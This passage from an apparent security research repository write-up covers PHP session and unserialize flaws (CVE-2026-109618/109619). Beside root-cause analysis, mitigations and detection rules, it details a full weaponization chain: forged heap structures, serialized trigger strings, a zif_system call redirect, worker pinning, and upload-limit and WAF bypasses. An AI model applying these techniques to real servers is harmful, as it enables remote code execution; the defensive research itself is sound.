- This chain requires the config mismatch **plus** a loaded destruct gadget —
  it is not an application-independent exploit; see §0.

## 3. Root Cause Analysis

### 3.1 Session Fixation (ext/session/session.c)

```c
// MULTIPART_EVENT_FORMDATA handler — no use_only_cookies check
if (name_len == progress->sname_len && 
    memcmp(data->name, PS(session_name), name_len) == 0) {
    zval_ptr_dtor(&progress->sid);
    ZVAL_STRINGL(&progress->sid, (*data->value), value_len);
    // ← Accepts PHPSESSID from POST body regardless of use_only_cookies!
}
```

Fix: [PR #22113](https://github.com/php/php-src/pull/22113) adds `!PS(use_only_cookies) &&` check.

### 3.2 Unvalidated Filename

```c
// FILE_START handler stores raw filename
add_assoc_string_ex(&progress->current_file, "name", 
                    sizeof("name") - 1, *data->filename);
// ← No sanitization, no encoding, no length limit
```

Filename can contain arbitrary bytes including PHP code and pipe `|` characters.

### 3.3 var_destroy Reentry UAF (ext/standard/var_unserializer.re)

```c
void var_destroy(php_unserialize_data_t *var_hashx) {
    // Phase 1: FREE extension chunks
    while (var_hash) {
        efree_size(var_hash, sizeof(var_entries));  // ← line 245
        var_hash = next;
    }
    // Phase 2: walk dtor chain
    while (var_dtor_hash) {
        // ...
        i_zval_ptr_dtor(zv);  // ← line 310, NO serialize_lock!
        // __destruct fires → inner unserialize() → R:N reads freed chunk
    }
}
```

### 3.4 Serializer Leak (ext/session/session.c)

```c
static void php_rshutdown_session_globals(void) {
    // Resets: PS(id), PS(session_vars), PS(http_session_vars), PS(mod_data)
    // Does NOT reset: PS(serializer) ← persists across FPM requests!
}
```

### 3.5 `__destruct` on Decode Failure

```c
PS_SERIALIZER_DECODE_FUNC(php) {
    while (p < endptr) {
        // ... find |, deserialize value ...
        if (php_var_unserialize(...)) {
            php_set_session_var(name, &rv, &var_hash);  // object stored
        } else {
            retval = FAILURE; goto break_outer_loop;
        }
    }
break_outer_loop:
    PHP_VAR_UNSERIALIZE_DESTROY(var_hash);  // ← __destruct fires HERE
    return retval;  // FAILURE
}
```

Even though the decoder returns FAILURE and `session_start()` calls `php_session_cancel_decode()` to destroy `$_SESSION`, the object's `__destruct` has ALREADY fired during `var_hash` cleanup.

## 4. Version Matrix

| Version | upload_progress | Vulnerable | Official Fix |
|---------|----------------|------------|--------------|
| < 5.4 | No | No | N/A |
| 5.4 - 5.6 | Yes | Yes | EOL, no fix |
| 7.0 - 7.3 | Yes | Yes | EOL, no fix |
| 7.4 | Yes | Yes | EOL — [official source backport](https://github.com/php/php-src/tree/PHP-7.4-CVE-2026-109618-109619) |
| 8.0 | Yes | Yes | EOL — [official source backport](https://github.com/php/php-src/tree/PHP-8.0-CVE-2026-109618-109619) |
| 8.1 | Yes | Yes | EOL — [official source backport](https://github.com/php/php-src/tree/PHP-8.1-CVE-2026-109618-109619) |
| 8.2.x | Yes | Yes | → 8.2.35 |
| 8.3.x | Yes | Yes | → 8.3.36 |
| 8.4.x | Yes | Yes | → 8.4.27 |
| 8.5.x | Yes | Yes | → 8.5.12 |

Also affected per the official advisory: FrankenPHP and LiteSpeed LSAPI
serving requests, regardless of upload_progress. PHP 8.2 reaches EOL on
2026-12-31.

## 5. Detection

```bash
# Check PHP version
php -r 'echo PHP_VERSION, PHP_EOL;'

# Check upload_progress setting
php -r 'echo ini_get("session.upload_progress.enabled"), PHP_EOL;'

# Check for handler mismatch across directories
find /var/www -name ".user.ini" -exec grep -l "serialize_handler" {} \;

# Monitor for exploitation attempts
grep -r "PHP_SESSION_UPLOAD_PROGRESS" /var/log/nginx/access.log
```

## 6. Mitigation

**Per the official advisory, updating to 8.2.35 / 8.3.36 / 8.4.27 / 8.5.12
is the only complete mitigation.** The following reduce exposure to
specific paths only:

```ini
; ---- CVE-2026-109618 (OOM corruption) ----
; Set ADMINISTRATIVELY (php_admin_value / FPM pool) so apps cannot override,
; and verify no pool/dir/app setting restores a finite limit:
memory_limit = -1
; Removes the controllable PHP-limit OOM trigger. NOT complete: an mmap()
; failure can still reach the vulnerable longjmp() path.
post_max_size = 8M        ; 32M if uploads needed; keep upload_max_filesize below
                           ; enforce decoded size / field count / part count /
                           ; header count at the frontend too (must cover
                           ; requests WITHOUT usable Content-Length)

; ---- CVE-2026-109619 (stale global state) ----
session.upload_progress.enabled = 0
; MUST be administrative (php.ini / FPM pool / server config applied before
; request parsing) followed by RESTARTING EVERY WORKER.
; .user.ini and ini_set() do NOT work for this path.
fatal_error_backtraces = 0   ; PHP 8.5 only
```

Hard rules from the advisory:

- Do **not** use `RLIMIT_AS` / `RLIMIT_DATA` as substitutes — they make
  `mmap()` fail once limits are reached, *triggering* the vulnerable path.
- Hiding diagnostics (`error_reporting`, `display_errors`, `@`) does **not**
  protect — stale global state is consumed before PHP decides whether to
  report.
- Container/cgroup `memory.max` is an availability boundary, not a fix;
  per-worker cgroups preferred. `pm.max_requests=1` breaks the cross-request
  producer→consumer requirement at a performance cost.
- Eliminate attacker-reachable fatal errors (parse, uncaught, `require`
  failure, execution timeouts) and post-shutdown diagnostics.
- The research-chain mitigations below remain valid for **this repo's
  chains only** (they were never complete for the CVEs):

```ini
; Research chains (A/B/C) hardening
session.use_only_cookies = On
session.use_strict_mode = On
session.serialize_handler = php_serialize   ; consistent across ALL dirs
```

## 7. References

- [Official PHP security advisory (2026-10-21)](https://www.php.net/archive/2026.php#2026-10-21-5)
- [GHSA-w8hw-w9fx-j79w — CVE-2026-109618, RCE via OOM corruption](https://github.com/php/php-src/security/advisories/GHSA-w8hw-w9fx-j79w)
- [GHSA-6wmf-4rv5-p3rp — CVE-2026-109619, RCE via stale global state](https://github.com/php/php-src/security/advisories/GHSA-6wmf-4rv5-p3rp)
- [PR #22113 — Session fixation fix](https://github.com/php/php-src/pull/22113)
- [Calif.IO — Serializable UAF](https://calif.io/research/php-uaf)
- [dinosn — var_destroy UAF](https://github.com/dinosn/php-8.5.5-var_destroy-uaf)
- [PHP Bug #71101 — Handler mismatch](https://bugs.php.net/bug.php?id=71101)
- [cnpanda — Handler mismatch exploitation](https://www.cnpanda.net/en/sec/580.html)

---

## 0.8 Weaponization progress — rungs 1-3 reproduced (lab-zendmm-fpm)

Lab: `lab-zendmm-fpm/` (:18085) — PHP 8.2.34 built from the official source
with the PRODUCTION allocator shape (plain ZendMM, no ASAN, no
--enable-debug) plus the `[UAFDBG]` instrumentation patch
(`lab-zendmm-fpm/instrument.py`: INIT/DESTROY with the bookkeeping pointer,
the session-decode data pointer, the stale-deref wrapper, var_access
id/entries/used and the returned zval, 3-page allocation traces).

Established, with evidence from the traces:

**Rung 1 — attacker-byte reclaim (calibrated).** The producer arms exactly
as in §0.6.1 (INIT publishes d at a 3-page ZendMM large allocation —
consistently chunk page 112 in this build — no DESTROY, worker survives).
The consumer request's own FILLUNIT-sized multipart buffers stream the RAW
REQUEST BODY through the chunk, overlaying the freed bookkeeping. A
consumer body carrying an offset-encoded marker field made the stale
`last` resolve to `0x6000` — the marker counter — proving the freed
struct's bytes are attacker-controlled, with the stable mapping:

    addr(marker_offset m) = d - 0x6000 + m

**Rung 2 — forged bookkeeping.** The consumer body carries a forged
`php_unserialize_data` at marker offset 0x6000: `last`/`first_dtor`/
`last_dtor` pointing at fake `var_entries`/`var_dtor_entries` blocks
elsewhere in the marker, `entries.used_slots = 2`, `entries.data[]`
pointing at forged zvals. Evidence: `WRAP last=0x...72000` (the forged
pointer, dereferenced safely), `WRAP2 used=1` (the fake block's
used_slots), `RREF id=0 entries=d+0x38 used=2` (var_access walked the
forged embedded entries).

**Rung 3 — weaponized read.** Session C's injected filename (`x|R:1;`)
makes the consumer's php-handler mismatch decode parse `R:1;` as the
session value; the 1-based reference resolves the forged
`entries.data[0]`, returning the attacker-forged zval. Evidence:

    RVAL id=0 zval=0x...72100 type=4 lval=0x13371337

— an IS_LONG forged as raw request-body bytes, returned through the
dangling decoder state and copied as the decoded value. Worker survives
(halt-free; the forged pointers all target mapped marker bytes).

Lab findings en route: the stale state is ONE-SHOT per producer (the
consumer request's own Basic RINIT memsets it after php_hash_environment —
the consumer must be the first request after the producer, with all
sessions pre-built); the freed struct's pages also get overlaid by the
consumer's own decode allocations (observed used=0 -> used=15/29 drift —
the session-content arrays); fake zvals must be placed on pages that
survive the request's post-marker allocations (the session-read
zend_string's small-bin page collided with marker offset 0xA000; the
fake-entries page held).

**Rung 4 — the negative-`used_slots` destructor-slot write**
(`poc/verify_109619_weaponized_write.py`). The forged `last_dtor` points
at a fake `var_dtor_entries` whose `used_slots` is negative; the
capacity check in `tmp_var()` (`used_slots + num > VAR_DTOR_ENTRIES_MAX`)
assumes non-negative and passes, and the selected slot is
`block + 16 + 16 x used_slots` — before the block, at an
attacker-chosen address. Trigger: session C's filename carries, after
the pipe, `a:2:{i:0;s:6:"PWNED!";i:0;i:7;}` — a DUPLICATE serialized key
reaches `var_push_dtor_value()` (the write-up's exact trigger). Evidence
(all one consumer request, worker survives):

    DTVAR nump=1 last_dtor=0x...72400 used=-321     <- forged block honored
    DTPUSH type=6 val=0x...021a0                    <- var_push_dtor_value fires
    DTVAR ... used=-320                              <- preservation slot -320
    RVAL id=0 zval=0x...71010 type=6 lval=0x...021a0 <- written zval read back
                                                       at the chosen address

`ZVAL_COPY_VALUE` wrote the 16-byte `{pointer, IS_STRING}` zval at the
address chosen by the negative count, and the R:1 reference (forged
`entries.data[0]` aimed at the same address) read it back — the
write-up's "we control where PHP places a pointer and its associated
type information".

Lab finding: `var_tmp_var()` itself takes the DTOR path — the decoded
values' `current` slots also land at attacker-chosen addresses through
the same forged block (the first decoded value occupied slot -321, the
duplicate-key preservation slot -320), i.e. the forged negative block
steers BOTH the ordinary tmp storage and the preservation write.

**Rung 5a — instruction-pointer control via forged-object destruction**
(`poc/verify_109619_rip_control.py`). The `r:1;` weak reference (the r:
rule requires an IS_OBJECT target and does a plain ZVAL_COPY + GC_ADDREF)
injects a fully forged IS_OBJECT zval pointing at a fake `zend_object`
built in the consumer's marker bytes: gc.refcount 0 (so the session
destroy's delref reaches 0), type IS_OBJECT, `handlers` -> a forged
`zend_object_handlers` table whose `dtor_obj` is a sentinel
(0x4141414141414141). The decode failure cleanup destroys $_SESSION,
walks the bucket, and `zend_objects_store_del` executes:

    RCDTOR type=8 p=0x...72500                    <- refcount zero reached
    OBJDEL obj=0x...72500 rc=0 handlers=0x...72600
           dtor_obj=0x4141414141414141            <- the call target: ours
    -> SIGSEGV at the sentinel; FPM child exit; nginx 502

Every byte of the called-through state (the zval, the object header,
the handlers table, the function pointer) originated in the consumer's
multipart marker field. `ce` is never read — the dtor_obj comparison
short-circuits — so the fake object needs only gc/handle/handlers.

Lab finding: the `R:` (strong reference) rule is unusable as the
injection vehicle — it wraps the target in a zend_reference via
ZVAL_NEW_REF, and php_session_normalize_vars() then moves the reference
with ZVAL_COPY_VALUE + ZVAL_UNDEF, leaking the reference's refcount, so
the reference (and the object) is never destroyed. The `r:` rule keeps
the accounting clean: refcount 0 -> r:+1 -> bucket ownership ->
array-destroy delref -> 0.

Remaining rung (not reproduced): rung 5b — actual command execution.
The controlled call `dtor_obj(object)` provides r0 = the forged object
pointer; turning that into a fixed benign command requires a
call-shape-compatible target (gadget or function), which remains
iterative work. The final proof in this repo remains a fixed allowlisted
command; no arbitrary-target or arbitrary-command packaging (repo
scope).

## 0.9 Rung 5b — the terminal call: forged execute_data -> zif_system

(`poc/verify_109619_rce.py`, `lab-zendmm-fpm/` with the rung-5b
instrument.py — the OBJDEL print now also carries `zsys=<ptr>`, the
runtime address of `zif_system` in this build.)

The controlled indirect call from rung 5a provides
`dtor_obj(object)` with r0 = the forged object pointer. Pointing
dtor_obj at a PHP internal function turns the forged object into the
function's first argument. `zif_system(zend_execute_data*,
zval* return_value)` — `ext/standard/exec.c`, compiled into every PHP
build even with `--disable-all` — is the public exploits' terminal
gadget (9bie, dinosn Chain B) because its entire argument surface is
forgeable from the marker bytes:

    zend_object layout      zend_execute_data layout (same memory)
    -----------------       --------------------------------------
    off  0  gc              off  0  opline          (gc bytes — set)
    off  8  handle + pad     off  8  call            (unused by ZPP)
    off 16  ce              off 16  return_value    -> scratch zval
                               (ce short-circuited: dtor_obj != builtin)
    off 24  handlers        off 24  func            (unused by ZPP)
    off 32  properties      off 32  This.value
    off 40  props[0].u1     off 40  This.u1          = IS_UNDEF
    off 44  props[0].u2     off 44  This.u2.num_args  = 1
    off 48+ ...             off 48+ prev/symbol_table/rtc/enp = 0
                               off 80  ZEND_CALL_ARG(1) -> fake zval
                                          value -> fake zend_string
                                          u1 = IS_STRING
                                          string val = FIXED cmd bytes

ZPP(1,2) reads num_args at execute_data+44 and the "s" argument zval
at ZEND_CALL_ARG(execute_data, 1) == execute_data + 80
(ZEND_CALL_FRAME_SLOT = 5 on this 80-byte zend_execute_data layout),
and the zend_string's len/val; php_exec then runs the command via
popen(cmd, "r") and RETVAL_*s into return_value — which at the
dtor_obj(object) call site is the leftover-rsi garbage register, so the
worker dies on the RETVAL write AFTER popen has run and the marker file
is on disk: crash-after-execution, the fire-then-die receipt shape
matched by the public exploits ('B status=<no head> ... FIRE_OK').

The FIXED BENIGN COMMAND (`id > /tmp/php2shell_rung5b 2>&1`,
hardcoded — not a CLI parameter) is the terminal proof: the marker file
read back from the lab container is the execution evidence.

Scope boundary: this rung uses the [UAFDBG] `zsys=` print as the
calibration oracle for the function address — the LAB analog of the
public exploits' base-discovery stages (9bie's two-phase display_errors
OOM-message leak; dinosn's in-band PS(id)->PHPSESSID cookie disclosure;
the Wiz "Heartbleed-style" primitive). Since 2026-10-28 the repo also
contains a **rung-6 leak harness** (`php2shell/leak.py`,
`poc/verify_psid_leak.py`, `poc/verify_a1b1_leak.py`) that models those
shapes without the oracle. It is lab-only, does not yet disclose live
(see §0.10), and is not packaged as a remote exploit. Arbitrary-command
interfaces and reverse-shell packaging remain out of scope: the proof
remains a fixed allowlisted command inside our own labs.

Worker disposition: after dtor_obj (= zif_system) returns normally,
zend_objects_store_del proceeds to the free_obj path; our handlers
table has free_obj = NULL, so the worker segfaults AFTER the command
executed and the marker is written — the same fire-then-die receipt
shape as the public exploits' (`B status='<no head>' ... FIRE_OK`).
A worker-surviving variant would point free_obj at a benign
return-only function; not needed for the proof.

Relation to the external landscape (2026-10-21):
- 9bie/php2shell-bypass-aslr-exp: zif_system @ libphp+offset, remote
  two-phase leak (display_errors=1), one-shot 3/3 on stock
  php:8.4.26-apache — our rungs 1-5b are the same ladder, lab-calibrated
- dinosn: two chains (stale-bucket pDestructor -> libc system();
  dangling-reference -> zif_system, gdb-free)
- WoYinDao: Chain B (var_destroy reentry UAF — our §3.3) ASAN-confirmed
  ALIVE on patched 8.4.27; `upload_progress.enabled=Off` kills only the
  session surface, not the parser-core paths — **reproduced here on
  2026-10-28**: `lab-asan-85x/` ASAN builds of 8.4.27 and 8.5.12 both still
  raise heap-use-after-free in `php_var_unserialize`
  (`var_unserializer.c:906`) under `poc/verify_uaf_asan.php`, where 8.2.34
  faults at `:850`. The CVE patch's `ZEND_HAS_OOM` guards are inert on the
  `var_destroy` re-entry path, so this adjacent UAF survives every patched
  release (requires a reachable `unserialize()`, like Chain C).
- Detection pack: see detection/ (Sigma + process-watcher + log
  signatures + un-restarted-worker audit notes)

### 0.9.1 Rung 5b lab findings (the retrieval round trip + the length boundary)

**In-band output retrieval (no container access).** The fixed command
writes into the webroot (`id>/var/www/html/p 2>&1` — /var/www/html is
the lab webroot bind-mount, served read-only by the lab nginx), and a
plain `GET /p` fetches the command output back through the web
server:

    [D] GET /p -> HTTP/1.1 200 OK
    body: 'uid=33(www-data) gid=33(www-data) groups=33(www-data)'

forge -> fire -> fetch, entirely over the wire — matching the public
exploits' retrieval shape (9bie reads the marker back after the
firing request; this repo does it with an HTTP GET since the fixed
command targets the served webroot). The FPM master replaces the
crashed child within the second, so the retrieval GET lands on a
fresh worker; nginx serves the static proof file directly.

**Forged-command length boundary.** The forged `zend_string` val at
FAKE_STR_OFF+24 survives the consumer request's allocations only up to
roughly 28 bytes at this marker offset in this build: a 40-byte
command's tail bytes were clobbered before ZPP read them (sh then
failed to parse the mangled command — silent, no file, worker still
died on the post-call path), while 23- and 28-byte commands fired
cleanly. The POC therefore keeps the fixed command short; a longer
command would need the string placed on a cleaner page (same
technique as the fake-entries placement in §0.8).

### 0.9.2 Rung-5b fixed-version negative control (patched 8.2.35)

`lab-zendmm-fpm-8235/` (:18086) — the same instrumented weaponization
lab (identical Dockerfile/instrument.py, `PHP_VERSION=8.2.35` build
arg) built from the PATCHED sources. The rung-5b POC run against it
must fail everywhere — and does:

    [A2] producer fatal: True        <- the OOM still happens (memory_limit
                                        is unchanged); what changed is
                                        its aftermath
    [B]  consumer INIT d=0x...77000 lock=0 level=1     <- FRESH allocation
         consumer WRAP d=0x...77000 last=0x...77040   <- fresh var_entries
         (no level=2 stale-consumption print; no DTVAR/WRAP2/RVAL of
          forged state; no OBJDEL of the forged object; no fire)
    [D]  GET /p -> 200, index fallback body (no proof file)
    verdict: forged object reached destruction: False
             fixed benign command executed:     False
             output retrieved over HTTP:        False

Blocking mechanism (maps to the advisory's remediation, §0.1): the
patch replaces the OOM `longjmp()` with a graceful soft-OOM delayed to
the next VM safe point plus complete stale-state resets at shutdown —
so the producer's fatal no longer abandons the decoder bookkeeping
(`BG(unserialize).data` is not left dangling), and the consumer's
`php_var_unserialize_init()` takes the FRESH branch (`level=1`) with
a new allocation instead of reusing stale state (`level=2`). The
consumer's forged marker bytes then overlay unrelated memory and the
chain dies before rung 1.

Contrast with the vulnerable build (§0.8/§0.9): same POC, same
instrumentation, same producer fatal — but the consumer INIT prints
`level=2` (stale pointer consumed), WRAP/RREF walk the forged
bookkeeping, RVAL returns the forged zval, OBJDEL fires dtor_obj =
zif_system, and the fixed command's output comes back over HTTP.

Also: instrument.py is now tolerant on patched sources (the zend_alloc
RUN/PAGES3 trace anchors sit in allocator internals the security patch
reworked; those prints are skipped with a warning — they only calibrate
reclaim page positions on the vulnerable build; all strict anchors
applied unchanged on 8.2.35, or the build would have failed).

### 0.9.3 CLI wrapper (php2shell.py) and repeatability notes

`php2shell.py <host> [-c id|uname|whoami] [-p port]` at the repo root —
the same invocation shape as the public POCs (Whackermelon
`php2shell.py <url> -c <cmd>`), defender-scoped: it drives this repo's
rung-5b chain (`poc/verify_109619_rce.py --cmd`, which now accepts a
BENIGN ALLOWLISTED base command only and composes the webroot redirect
automatically, enforcing the 28-byte forged-string boundary).

Repeatability lab notes:
- the chain is ONE-SHOT per worker generation (the stale consumer
  state is reset by the consumer request's own Basic RINIT — §0.8);
  reruns against the same worker fail silently (destruction reached,
  no fire)
- `docker compose restart php` is NOT sufficient for a clean rerun
  (the container fs — session save path included — survives a
  restart); use full `docker compose down && docker compose up -d`
  (recreate) for a fresh generation
- verified: fired on a fresh generation with `-c id` (output retrieved
  over HTTP); negative control (`-p 18086`, patched 8.2.35 lab)
  blocked with `-c uname`

---

## 1. Adaptive driver + Joomla lab (added 2026-10-22)

Follow-on work to the release, in this repo:

- **`php2shell_adaptive.py` + `php2shell/`** — one driver that fingerprints
  a lab target (app type, PHP version, SAPI, `upload_progress`,
  `serialize_handler` per dir, LFI/gadget/`obj_probe` reachability), selects
  the strongest applicable chain (rung-5b → Chain C → Chain A), executes it
  with a benign allowlisted command (`id|uname|whoami`), and returns the
  output. Scope guards: local lab hosts only, allowlist only, no arbitrary
  command / reverse shell / remote leak stage. See `docs/PLAN.md`.
- **`lab-joomla/`** — Joomla 5.4.10 on `php:8.2-fpm` (8.2.34) + `mysqli`/
  `pdo_mysql` + the same chain scaffolding (`app/` php_serialize dir,
  `api/` php dir + `FileLogger`, `lfi.php`, `obj_probe.php`, `sysinfo.php`),
  installed via the non-interactive CLI installer, served on `:18096`.
  Chains A and C both return `uid=33(www-data) ...` inside the Joomla
  worker.
- **Detection additions** — `detection/suricata_php2shell_upload_progress.rules`
  (network: upload-progress POST trigger, webroot proof-file fetch,
  timing-oracle threshold) and
  `detection/file_event_lnx_php2shell_webroot_artifact.yml`
  (host: webroot proof-file writes).

Cross-reference with the public full-chain ecosystem (see PLAN.md):
PHP 8.6 pre-release RC1–RC3 is also affected (fixed RC4); distro backports
(USN/DSA/RHSA/ALSA) can patch without changing the `php -v` string — check
the vendor advisory. The public tools' remote `r0` brute-force / dual-oracle
discovery stage remains out of scope for this repo.

---

## 0.10 Post-Wiz uplift — pinning, amplification, delivery, rung-6 harness

Wiz's 2026-10-27 telemetry ("PHP2Shell: Exploitation Attempts and
Remediation Trends") is the first population-level view of the chain in the
wild. Its three concrete failure observations map directly onto this repo:

| Wiz observation | Repo response (2026-10-28) |
|---|---|
| Legacy 1005-part chain dies at `post_max_size` | `poc/verify_legacy_chain.py` reproduces the exact 12.65 MB body, the gate rejection, **and** the chunked bypass (§0.4) |
| Current A1 exhausts memory, B1 fails to leak | `poc/verify_a1b1_leak.py` reproduces A1's OOM on stock mod_php (:18112); B1 still does not disclose — the same wall |
| Worker pinning unsolved | `php2shell/pinning.py` + `poc/verify_worker_pinning.py`: 4 workers → 1 PID on Apache prefork (:18110) and FPM (:18097) |
| Multi-MB bodies under the wire limit | `poc/verify_amplification.py`: 1.5 MB → 32 MB (21×) and 4 MB → 128 MB (32×) via duplicate part headers |
| Hardcoded `?page=` in app chains | `php2shell/lfi.py` + `poc/verify_lfi_discovery.py`: marker-verified parameter discovery |
| "PHP2Shell-branded" tools that are session poisoning + LFI | `poc/verify_session_poison_lfi.py`: progress value -> session file -> include, fixed benign command |
| Content-Type-anchored WAF rules miss a comma separator | `poc/verify_content_type_bypass.py`: PHP parses `multipart/form-data, boundary=X` |
| Build/limit guessing before firing | `php2shell/sapi.py` + `poc/verify_sapi_profile.py`: version, SAPI, exact `memory_limit` via the OOM probe, worker count |

### 0.10.1 Worker pinning, measured

`pinning.WorkerPinner` opens N-1 sockets that declare a 1 MB
`Content-Length`, send one byte, and stay open. On a 4-child pool the
control sample spreads over 4 PIDs; with 3 holders every probe request lands
on the fourth PID (`4 → 1`). Validated on:

- `lab-pure-modphp` (:18110) — Apache 2.4 prefork, `MaxRequestWorkers 4`;
- `lab-pinned` (:18097) — PHP-FPM `pm.max_children=4` behind nginx with
  `fastcgi_request_buffering off`. Without that directive nginx buffers the
  body before contacting FPM and the holders occupy nothing — a useful
  negative control.

Honest ceiling: the public default is 150 workers (149 holders). The
mechanism is identical, but this repo does not claim 149-holder scale or
internet-latency behaviour.

### 0.10.2 Amplification and delivery, measured

The duplicate part-header vector (dinosn) stores each 6-byte `X: a` line as
a ~256-byte smart_str. Measured on the stock mod_php lab:

| Target | Wire | OOM limit | Ratio |
|---|---|---|---|
| :18110 (32M) | 1.5 MB | 33,554,432 | 21.3× |
| :18111 (128M) | 4.0 MB | 134,217,728 | 32.0× |

Both bodies stay under `post_max_size` (48M / 8M respectively), which is
the point: the practical upload barrier is defeated while the wire is
legal. This is an OOM/DoS producer, not the escalation step.

The chunked delivery bypass is per-SAPI (§0.4): mod_php de-chunks into a
lengthless stream and skips the declared-length gate; FPM clamps POST reads
to the declared `CONTENT_LENGTH`. The legacy POC demonstrates both halves
on :18111.

### 0.10.3 Rung 6 — the leak harness, and why it does not fire yet

`php2shell/leak.py` implements the two public in-band shapes:

- **dinosn PS(id) cookie** — leak-A (1001 vars, `PHPSESSID=NUL`, OOM field,
  file part) then leak-B (742 array names, one carrying 257 elements);
  the response `Set-Cookie: PHPSESSID=` carries 512 bytes of heap. Derivation
  subtracts the build's `zval_ptr_dtor` offset for libphp, majority-votes
  2 MiB-aligned `arData` pointers for the chunk base.
- **9bie A1/B1** — A1 (860 depth-64 nested empty file parts, fillers, big
  and burner fields) then B1 (forged `zend_string` header inside a large
  value) for the stale-id OOB read.

Status, measured on stock `php:8.4.26-apache`:

- leak-A on :18110 produces the expected startup OOM and the
  "Session cookie cannot be sent after headers have already been sent"
  warning — the `send_cookie` arming the public chain relies on;
- leak-B returns a normal response with **no `PHPSESSID` cookie**;
- A1 on :18112 (limits lifted so the 860 parts are not truncated) OOMs at
  128 MB; B1 returns no cookie.

This is not a harness bug in the derivation (`verify_psid_leak.py
--self-test` passes deterministically). It is the same failure Wiz reports:
A1 reaches the intended memory-exhaustion condition, B1 does not produce
the leak. The remaining work is per-build heap calibration (the public
`target`/`fake_len`/`spec` values) and a worker-survival check after A1 —
see `docs/ECOSYSTEM.md` §6. Until that closes, the repo must not claim a
working remote ASLR bypass.

### 0.10.4 Detection

Wiz's IOCs and shapes are folded into
`detection/iocs_php2shell_2026-10-27.yml` and Suricata SIDs
210961804–810 (legacy 1005-part, A1 chunked, B1 array reclaim, `/tmp/sess_`
LFI receipt, inline PHP in the progress field, Content-Type comma bypass,
worker-occupation burst). The highest-value response signature remains a
`PHPSESSID` cookie far longer than a normal id; the IOC list is hunting
context, not a block list — Wiz saw only failed attempts.

### 0.11 CVE-2026-109618 terminal call (zif_system, no libc ROP)

The public 109618 chain (cookiengineer) uses a `free_obj` pivot to
`jump_fcontext` and a libc ROP (`pop rdi; ret` → `system`), requiring
**libphp + libc + heap**. This repo replaces the ROP with the rung-5b
trick: set `handlers->free_obj = zif_system` and shape the fake object so
it doubles as a `zend_execute_data` with one string argument. The call
site passes `rdi = object`, and `zif_system` parses `arg1` at
`object + 0x50` from a `zend_string` header at `object + 0x80`.

Only **libphp + heap** are needed. The OOM producer is the public
urlencoded form (`a[<80KB-key>][c]=v` + `pad` bin-28 grooming + `pad=x`),
which leaves `$_POST["a"]`'s last bucket unwritten (`nUsed=45/60` in
traces). `zend_array_destroy()` walks it, sees `IS_OBJECT`, and calls
`free_obj`.

Measured on stock `php:8.4.26-apache` **arm64**:

| Run | `arData` | `B = arData-512` | offset in chunk |
|---|---|---|---|
| ASLR off | `0xfffff425e600` | `0xfffff425e400` | `0x1e400` |
| ASLR on, fresh 8M | `0xffff8fe5e600` | `0xffff8fe5e400` | `0x5e400` |
| ASLR on, after 128M 9bie leak | `0xffffb0268000` | `0xffffb0267e00` | `0x67e00` |

The ASLR-on offsets are stable across generations (3/3), so
`B = leaked_chunk + offset` is viable.

**Proven (ASLR on):** with `libphp` and `chunk` read from
`/proc/<pid>/maps` + the chunk self-links, the body fires
`zif_system` and runs `id` (`poc/verify_109618_zif.py`,
`php2shell/cve109618.py`). Controls: `+0x1000` bias on the terminal
address prevents the fire; patched 8.4.27 blocks (200, no proof). No
libc, no gdb at fire time.

**Closed in-band (2026-10-29):** Apache prefork children are forked, not
execed, so every worker shares the same `libphp` and ZendMM chunk
mappings. The 128M leak can therefore run on one worker and the 8M OOM
fire on a **different, fresh** worker using the leaked addresses. The
fresh worker keeps the `n=46` / bucket-45 layout; there is no post-leak
heap shift. `poc/verify_109618_inband.py` on `lab-109618-fork/` reaches
`uid=33` with the proof fetched over HTTP; no `/proc` address reads and no
debugger.

Lab-only orchestration detail: the POC uses a `/lo/pid.php` endpoint (and
the leak's `X-Worker` header) to avoid the leak worker; the
`--worker-id none --retries 6` holder-rotation fallback also works. The
patched 8.4.27 in-band control fails at the leak (`no heap pointers`), as
expected.

**Honest ceiling:** the terminal call is proven with lab-assisted
addresses; it is *not yet* a remote chain. The 109619 in-band chain
(`php2shell/remote.py`) remains the only fully remote reproduction.

